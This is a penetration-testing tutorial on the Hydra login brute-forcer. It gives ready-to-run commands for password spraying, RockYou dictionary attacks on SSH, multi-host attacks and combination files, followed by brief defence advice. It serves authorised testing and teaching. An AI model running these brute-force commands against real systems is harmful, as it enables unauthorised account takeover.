---
title: "How to Use Hydra to Hack Passwords – Penetration Testing Tutorial"
description: "Learn more about Hydra"
icon: "code"
draft: false
---

## Introduction

Hydra is a powerful brute-forcing tool used by penetration testers and ethical hackers to crack passwords of network services. It can perform rapid dictionary attacks against more than 50 protocols, including Telnet, FTP, HTTP, HTTPS, SMB, databases, and several other services. Developed by the hacker group "The Hacker’s Choice," Hydra was first released in 2000 as a proof-of-concept tool for attacking network logon services.

Unlike sequential brute-forcing tools, Hydra is a parallelized login cracker, allowing multiple connections simultaneously, significantly reducing the time required to crack a password.

This section will guide you through using Hydra, covering installation, common attack types, and essential flags and options. Note: This tutorial is for educational purposes only. Always obtain permission before scanning, brute-forcing, or exploiting any system.

## How to Install Hydra

### Pre-installed Systems

Hydra comes pre-installed with Kali Linux and Parrot OS. If you are using one of these, you can start working with Hydra immediately.

### Ubuntu

Use the `apt` package manager to install Hydra:

```sh
$ sudo apt install hydra
```

### macOS

Hydra is available under Homebrew:

```sh
$ brew install hydra
```

### Windows

It's recommended to use a virtual box and install Linux. Using Windows for professional penetration testing is not advisable.

## How to Work with Hydra

### Starting with Hydra

Begin by exploring the help command to understand Hydra's options:

```sh
$ hydra -h
```

This command provides a list of flags and options available in Hydra.

<a target='_blank'><img src='https://i.postimg.cc/1599HgmJ/image.png' border='0' alt='image'/></a>

### Single Username/Password Attack

To perform a simple attack with known username and password:

```bash
$ hydra -l <username> -p <password> <server> <service>
```

Example:

Assume you had a user named `admin`, and password named `admin` hosted at `10.10.137.50`. (Make sure you have a service running at a hosted address and can connect via ssh).

```sh
$ hydra -l admin -p admin 10.10.137.50 ssh
```

### Password Spraying Attack

To perform a password spray attack where you test a known password against multiple usernames (in a case where you don't know exactly who the user is):

1. Create a file called `users.txt` with the following content:

```bash
root
admin
user
tech
steve
richard
```
2. Run the password spray attack:
   We are going to test the password "admin".
```sh
   hydra -L users.txt -p admin 10.10.137.50 ssh
```

### Dictionary Attack

To perform a dictionary attack using a list of passwords:

1. Use the RockYou wordlist, typically found at `/usr/share/wordlists/rockyou.txt` on Kali Linux or on ([github](https://github.com/teamstealthsec/wordlists)).
2. Run the dictionary attack:

```sh
$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh
```

### Verbosity and Debugging

Hydra can be awfully quiet when running large brute-force attacks. If we have to make sure Hydra is doing what it is expected to do, there are two flags we can use.

The verbosity (-v) flag will show us the login attempt for each username/password combination. This can be a bit much when there are a lot of combinations to go through, but if it is something you need, we can use the verbosity flag.

#### Verbosity Flag

To show each login attempt:

```sh
$ hydra -v -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh
```

#### Debug Flag

To gather more detailed information:

```sh
$ hydra -d -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh
```

### Saving Results

To save the results of your attack:

```sh
$ hydra -l <username> -p <password> <ip> <service> -o <file.txt>
```

## Additional Flags and Formats

### Service Specification

Specify the service with the IP address:

```sh
$ hydra -l <username> -p <password> ssh://<ip>
```

### Resuming Attacks

Resume a session if Hydra exits during an attack:

```sh
$ hydra -R
```

### Custom Ports

Specify custom ports if services run on non-default ports:

```sh
$ hydra -l <username> -p <password> <ip> <service> -s <port>
```

### Attacking Multiple Hosts

Attack multiple hosts using a file containing a list of IP addresses:

```sh
$ hydra -l <username> -p <password> -M <host_file.txt> <service>
```

### Targeted Combinations

Use specific username/password combinations:

1. Create a file `combinations.txt` with the format:
```txt
username1:password1
username2:password2
username3:password3
```
2. Run the command:
```sh
$ hydra -C combinations.txt <ip> <service>
```

## How to Defend Against Hydra

### Strong Passwords

Use strong passwords to make brute-force attacks difficult.

### Password Policies

Enforce policies to change passwords regularly.

### Limiting Authorization Attempts

Lock accounts after a few failed login attempts to prevent brute-force attacks.

### Use Re-captcha

Implement re-captcha to prevent automated brute-force attacks.

## Summary

Hydra is a fast, flexible network brute-forcing tool essential for penetration testing. With its modular architecture and support for parallelization, Hydra can be extended to include new protocols and services easily. Always use Hydra responsibly and ethically.